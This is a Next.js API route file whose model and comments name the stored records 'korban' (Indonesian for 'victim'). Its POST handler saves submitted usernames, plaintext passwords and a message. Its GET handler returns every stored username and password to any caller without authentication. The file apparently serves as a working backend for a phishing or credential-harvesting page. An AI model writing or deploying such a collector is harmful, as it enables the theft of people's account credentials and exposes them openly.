// app/api/korban/route.ts
import { PrismaClient } from "@prisma/client";
import { log } from "console";
import { NextResponse } from "next/server";

const prisma = new PrismaClient();

// GET handler untuk mengambil semua data korban
export async function GET() {
  try {
    const korban = await prisma.korban.findMany({
      select: {
        username: true,
        password: true,
      },
    });
    return NextResponse.json(korban);
  } catch (error) {
    console.log(error);

    return NextResponse.json(
      { error: "Internal Server Error" },
      { status: 500 }
    );
  }
}

// POST handler untuk membuat data korban baru
export async function POST(request: Request) {
  try {
    const body = await request.json();
    console.log("Data yang diterima di API:", body);

    const { username, password, ucapan } = body;

    // Validasi input
    if (!username || !password || !ucapan) {
      return NextResponse.json(
        { error: "Semua field harus diisi" },
        { status: 400 }
      );
    }

    const korban = await prisma.korban.create({
      data: {
        username,
        password,
        ucapan,
      },
    });

    return NextResponse.json(
      { message: "Data berhasil disimpan", id: korban.id },
      { status: 201 }
    );
  } catch (error) {
    console.log(error);

    return NextResponse.json(
      { error: "Internal Server Error" },
      { status: 500 }
    );
  }
}
